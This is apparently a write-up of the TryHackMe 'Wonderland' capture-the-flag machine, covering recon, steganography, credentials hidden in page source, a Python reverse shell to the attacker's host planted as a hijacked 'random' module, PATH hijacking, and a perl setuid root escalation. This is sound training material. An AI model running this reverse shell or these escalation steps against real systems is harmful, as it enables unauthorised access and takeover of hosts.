# Wonderland

This is for the Medium difficulty Wonderland machine found at (https://tryhackme.com/room/wonderland)
_____________
# Recon and Enumeration

We will start out by running the same nmap script we typically run.

nmap -sC -sV -Pn

Running this scan enumerates the following services:

```shell
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-31 13:51 MDT
Nmap scan report for 10.10.124.89
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.22 seconds
```

__________

Following the http link leads us to a page with the following quote from Alice's Adventures in Wonderland and a picture of the White Rabbit
```text
    Follow the White Rabbit.

"Curiouser and curiouser!" cried Alice (she was so much surprised, that for the moment she quite forgot how to speak good English)
```

First let's try inspecting the page, then we will try gobuster on it

Inspecting the source does lead us to the img folder for the site, which lists 3 image files 

```text
alice_door.jpg
alice_door.png
white_rabbit_1.jpg
```

We'll go ahead and pull them down to look at after we check things out more.  I suspect given that alice_door.jpg and .png are both the same image, that the png has a zip file hidden within or we will need to do a binary dive.


_______________
Gobuster discovers the following

===============================================================
/img                  (Status: 301) [Size: 0] [--> img/]
/index.html           (Status: 301) [Size: 0] [--> ./]  
/r                    (Status: 301) [Size: 0] [--> r/]  
                                                        
===============================================================

When we go to the /r folder, we find naught but another quote

```text
"Would you tell me, please, which way I ought to go from here?"
```

Let's go ahead and look at these images further.

______
After wgetting them down, I run xxd on the alice_door files.  The png doesn't show much, but the jpg has what appears to be exifdata.  

Taking this information I run exiftool on the file and find the following:

Software                        : Adobe Photoshop CS3 Macintosh

Modify Date                     : 2008:01:20 01:49:10

Thumbnail Image                 : (Binary data 12311 bytes, use -b option to extract)

Not much here currently.  Though it is curious that this file has exifdata.  Let's try using steghide to find any other hidden info in the images.

Using it on white_rabbit_1.jpg without a passphrase leads us to `"Follow the r a b b i t"`  

Using rabbit as a steghide password on the other images leads us nowhere.  Wait, one of the directories was http://*ip*/r...

http://*ip*/r/a

```text
Keep Going.

"That depends a good deal on where you want to get to," said the Cat.
```


http://*ip*/r/a/b

```text
Keep Going.

"I don’t much care where—" said Alice.
```


http://*ip*/r/a/b/b 

```text
Keep Going.

"Then it doesn’t matter which way you go," said the Cat.
```


http://*ip*/r/a/b/b/i

```text
Keep Going.

"—so long as I get somewhere,"" Alice added as an explanation.
```



http://*ip*/r/a/b/b/i/t

```text
Open the door and enter wonderland

"Oh, you’re sure to do that," said the Cat, "if you only walk long enough."

Alice felt that this could not be denied, so she tried another question. "What sort of people live about here?"

"In that direction,"" the Cat said, waving its right paw round, "lives a Hatter: and in that direction," waving the other paw, "lives a March Hare. Visit either you like: they’re both mad."
```

This finally leads us to the alice_door.jpg file.  But using steghide tells us we don't have the password.  Let's poke around the page source.

```shell
<p style="display: none;">alice:HowDothTheLittleCrocodileImproveHisShiningTail</p>
```

Ding-Dong, let's open this door!  The door image may be a rabbit hole.  Let's ignore that and try ssh directly!

`ssh alice@wonderland`

We're in!

... This is weird, root.txt is right here?

```shell
alice@wonderland:~$ cat root.txt
cat: root.txt: Permission denied
```


There is also a python script: walrus_and_the_carpenter.py



## Vulnerability Assessment
_________________

`ls -la` says that while we don't have write permissions on the script, we do have read permissions.  Let's cat it out.  It appears to be a poem randomizer, using random to find the lines.

Can we change dir?  Yes!

We can now see that there are accounts for hatter and rabbit as well.  Maybe we can find something out from this.

Can we find sudo permissions?

`sudo -l`

```text
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Interesting that we can run sudo as rabbit.  Is it possible we can take advantage of the random module in the script?  To the internet!

From here, I came across some resources telling me that it is very possible that the python script will look in the current working directory first when importing the module.  In this case, I just need to create a script called `random.py` and running the walrus script with the sudo cred and path should allow my script to run.  In doing this I should be able to reverse shell and gain access to the rabbit account.


## Exploitation
____________________________


I will just use a simple reverse shell script using sockets

```shell
#!
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.13.46.115",5000))
p=subprocess.call(["/bin/bash","-i"])  
```
Now we run the script with `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`


whoami reveals that I am now rabbit@wonderland

Navigating to the rabbit directory finds one file

```text
rabbit@wonderland:/home/rabbit$ ls
teaParty
```

teaParty appears to be an executable file.  If we cat it out we notice that there appears to be an easy vuln just sitting there with the seg fault, but in getting the file on our local machine we can analyze it and see it is fake!  It is put in directly by the program. But there is also something juicier.  It appears to use the date variable by taking date and adding an hour.  

In searching I found a way to privesc from the usage of this variable by writing the date variable in tmp and setting the path to the tmp directory.   Typically this would land us as root, but for whatever reason, in this case, it only gets us to the Hatter account.

```text
rabbit@wonderland:/home/rabbit$ cd /tmp
rabbit@wonderland:/tmp$ echo "/bin/bash" > date
rabbit@wonderland:/tmp$ chmod 777 date
rabbit@wonderland:/tmp$ echo $PATH
/tmp:/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
rabbit@wonderland:/tmp$ export PATH=/tmp:$PATH
rabbit@wonderland:/tmp$ cd /home/rabbit
rabbit@wonderland:/home/rabbit$ ./teaParty 
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by hatter@wonderland:/home/rabbit$ ls
teaParty
hatter@wonderland:/home/rabbit$ 
```
Running `sudo -l` on this account doesn't seem to do anything as we don't have the Hatter password.  Luckily the password is just sitting in password.txt!

```text
hatter@wonderland:/home/hatter$ cat password.txt 
WhyIsARavenLikeAWritingDesk?
```

Now we can run the command and..... Hatter has no sudo privileges.  We also have no authorization to any new or interesting files.  I guess at this time it is time to give in and run linpeass.

I scp linpeass from my machine to the hatter account and run it, an dnotice something interesting:
```text

Files with capabilities (limited to 50):
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```
perl has capabilities!  And as luck would have it, gtfobins tells us that we can indeed run the following on perl with capabilities to get root:


```shell
hatter@wonderland:/$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'`
#
# whoami
root
```

We can now go back to the alice account and cat out the password thm{*root*}, but where is the user.txt?  Turns out we missed it and it was sitting in the root directory all along.  Everything really is upside down here.

thm{"*user*"}












